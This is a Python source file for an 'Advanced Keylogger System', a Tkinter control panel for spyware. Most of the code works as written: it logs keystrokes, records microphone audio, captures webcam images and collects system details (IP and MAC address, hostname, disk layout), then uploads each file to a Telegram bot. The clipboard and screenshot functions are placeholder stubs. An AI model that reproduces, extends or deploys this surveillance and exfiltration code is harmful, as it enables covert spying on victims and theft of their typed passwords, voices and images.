import os
import threading
import time
import tkinter as tk
from tkinter import messagebox
import requests
import platform
import psutil
import socket
import pyaudio
import wave
import cv2
from pynput.keyboard import Key, Listener

# Telegram bot token and chat ID - Configure these in environment variables
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID_HERE')

# Set the file path where logs will be stored
file_path = os.path.join(os.getcwd(), "logs")
os.makedirs(file_path, exist_ok=True)

keys_info = os.path.join(file_path, "key_log.txt")
system_info_path = os.path.join(file_path, "system_info.txt")
clipboard_info = os.path.join(file_path, "clipboard.txt")
audio_info = os.path.join(file_path, "audio.wav")
screenshot_info = os.path.join(file_path, "screenshot.png")
webcam_info = os.path.join(file_path, "webcam.png")

def send_to_telegram(file_path, caption):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument'
    files = {'document': open(file_path, 'rb')}
    data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
    response = requests.post(url, files=files, data=data)
    if response.status_code == 200:
        print(f"File sent successfully: {caption}")
    else:
        print(f"Failed to send file: {caption}")

def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:
                return addr.address
    return 'N/A'

def get_system_info():
    system_info = {
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=True),
        "CPU Frequency": psutil.cpu_freq().current if psutil.cpu_freq() else 'N/A',
        "Total RAM": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
        "Available RAM": f"{psutil.virtual_memory().available / (1024 ** 3):.2f} GB",
        "Used RAM": f"{psutil.virtual_memory().used / (1024 ** 3):.2f} GB",
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "MAC Address": get_mac_address(),
        "Disk Partitions": [(dp.device, dp.mountpoint, dp.fstype, f"{psutil.disk_usage(dp.mountpoint).percent}%") for dp in psutil.disk_partitions()]
    }

    return system_info

def write_system_info_to_file(file_path):
    system_info = get_system_info()
    with open(file_path, 'w') as file:
        file.write("System Information\n")
        file.write("==================\n\n")
        for key, value in system_info.items():
            if key == "Disk Partitions":
                file.write(f"{key}:\n")
                for partition in value:
                    file.write(f"  Device: {partition[0]}, Mountpoint: {partition[1]}, Filesystem: {partition[2]}, Usage: {partition[3]}\n")
            else:
                file.write(f"{key}: {value}\n")

def system_information():
    print("System information gathering...")
    write_system_info_to_file(system_info_path)
    send_to_telegram(system_info_path, "System Information")

def copy_clipboard():
    print("Clipboard data copying...")
    with open(clipboard_info, "w") as f:
        f.write("Clipboard Data")
    send_to_telegram(clipboard_info, "Clipboard Data")

def microphone():
    print("Microphone recording...")

    # Set up the parameters for recording
    FORMAT = pyaudio.paInt16  # 16-bit resolution
    CHANNELS = 1  # Mono
    RATE = 44100  # 44.1kHz sampling rate
    CHUNK = 1024  # 2^10 samples for buffer
    RECORD_SECONDS = 10  # Duration of recording
    WAVE_OUTPUT_FILENAME = audio_info

    # Initialize pyaudio
    audio = pyaudio.PyAudio()

    # Start recording
    stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    print("Recording...")

    frames = []

    # Store data in chunks for RECORD_SECONDS
    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    # Stop and close the stream
    print("Finished recording.")
    stream.stop_stream()
    stream.close()
    audio.terminate()

    # Save the recorded data as a WAV file
    wave_file = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wave_file.setnchannels(CHANNELS)
    wave_file.setsampwidth(audio.get_sample_size(FORMAT))
    wave_file.setframerate(RATE)
    wave_file.writeframes(b''.join(frames))
    wave_file.close()

    # Send the recorded audio file to Telegram
    send_to_telegram(WAVE_OUTPUT_FILENAME, "Audio Recording")

def screenshots():
    print("Taking screenshots...")
    with open(screenshot_info, "w") as f:
        f.write("Screenshot Taken")
    send_to_telegram(screenshot_info, "Screenshot")

def webcam_snapshots():
    print("Taking webcam snapshots...")

    # Initialize the webcam
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("Error: Could not open webcam.")
        return

    # Capture a single frame
    ret, frame = cap.read()
    if ret:
        # Save the frame as an image file
        cv2.imwrite(webcam_info, frame)
        print("Webcam snapshot taken.")
    else:
        print("Error: Could not read frame from webcam.")

    # Release the webcam
    cap.release()

    # Send the captured image to Telegram
    send_to_telegram(webcam_info, "Webcam Snapshot")

def keylogger():
    def on_press(key):
        with open(keys_info, "a") as f:
            f.write(f"{key}\n")

    def on_release(key):
        if key == Key.esc:
            # Stop listener
            return False

    # Clear the log file at the start
    with open(keys_info, "w") as f:
        f.write("Keylogger started...\n")

    # Collect events until released
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Send the log file to Telegram
    send_to_telegram(keys_info, "Keylogger Data")

def start_keylogger():
    threading.Thread(target=keylogger).start()
    messagebox.showinfo("Info", "Keylogger Started")

def stop_keylogger():
    os._exit(0)  # This will terminate the keylogger process
    messagebox.showinfo("Info", "Keylogger Stopped")

def start_threaded_function(target_function, info_message):
    threading.Thread(target=target_function).start()
    messagebox.showinfo("Info", info_message)

# Main Tkinter GUI
root = tk.Tk()
root.title("Advanced Keylogger System")
root.geometry("400x500")
root.configure(bg="#2c3e50")  # Set background color

# Heading
heading = tk.Label(root, text="Advanced Keylogger System", bg="#2c3e50", fg="white", font=("Helvetica", 16, "bold"))
heading.pack(pady=20)

# Buttons for each monitoring task
buttons = [
    ("Start System Information", lambda: start_threaded_function(system_information, "System Information Gathering Started")),

    ("Start Microphone Recording", lambda: start_threaded_function(microphone, "Microphone Recording Started")),

    ("Start Webcam Snapshots", lambda: start_threaded_function(webcam_snapshots, "Webcam Snapshots Taking Started")),
    ("Start Keylogger", start_keylogger),
    ("Stop All Monitoring", stop_keylogger),
]

for (text, command) in buttons:
    button = tk.Button(root, text=text, command=command, bg="#34495e", fg="white", font=("Helvetica", 12))
    button.pack(pady=10, padx=20, fill=tk.X)

root.mainloop()
